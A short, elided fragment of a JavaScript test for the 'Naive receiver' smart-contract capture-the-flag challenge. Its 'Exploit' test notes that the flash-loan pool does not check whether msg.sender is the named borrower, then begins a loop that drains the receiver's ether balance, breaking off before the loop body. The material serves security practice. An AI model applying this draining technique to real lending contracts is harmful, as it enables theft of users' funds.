...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    let balance = await ethers.provider.getBalance(this.receiver.address);
    //pool doesn't really check if msg.sender is actual the real address in parameters asking for the loan
    while (balance.gt(ethers.utils.parseEther("1"))) {
